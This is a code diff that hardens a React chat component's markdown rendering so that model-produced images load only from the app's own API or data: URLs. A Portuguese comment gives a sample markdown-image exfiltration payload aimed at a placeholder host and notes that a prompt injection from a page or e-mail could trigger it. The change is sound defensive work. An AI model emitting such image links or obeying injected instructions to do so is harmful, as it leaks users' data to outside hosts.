@@ -28,7 +28,7 @@ import {
   useMemo,
   useState,
 } from "react";
-import { Streamdown } from "streamdown";
+import { defaultRehypePlugins, Streamdown, type StreamdownProps } from "streamdown";
 import { ModalLink } from "@/components/ModalLink";
 
 export type MessageProps = HTMLAttributes<HTMLDivElement> & {
@@ -327,6 +327,24 @@ const streamdownPlugins = { cjk, code, math, mermaid };
 // Modal padrão do Streamdown usa classes fora do scan do Tailwind e fica em largura total.
 const linkSafety = { enabled: true, renderModal: ModalLink };
 
+// Imagem em markdown carrega sozinha, sem clique: `![](https://x/?d=<dado>)` vaza o que o modelo
+// leu (prompt injection de página ou e-mail). Só a API do próprio app e data:. O default do Streamdown é "*".
+// A função vem do default do Streamdown: rehype-harden não é dependência direta do web.
+const [harden] = defaultRehypePlugins.harden as [unknown, object];
+const rehypePlugins = Object.values({
+  ...defaultRehypePlugins,
+  harden: [
+    harden,
+    {
+      defaultOrigin: window.location.origin,
+      allowedImagePrefixes: ["/api/"],
+      allowDataImages: true,
+      allowedLinkPrefixes: ["*"],
+      allowedProtocols: ["*"],
+    },
+  ],
+}) as NonNullable<StreamdownProps["rehypePlugins"]>;
+
 export const MessageResponse = memo(
   ({ className, ...props }: MessageResponseProps) => (
     <Streamdown
@@ -336,6 +354,7 @@ export const MessageResponse = memo(
       )}
       linkSafety={linkSafety}
       plugins={streamdownPlugins}
+      rehypePlugins={rehypePlugins}
       {...props}
     />
   ),
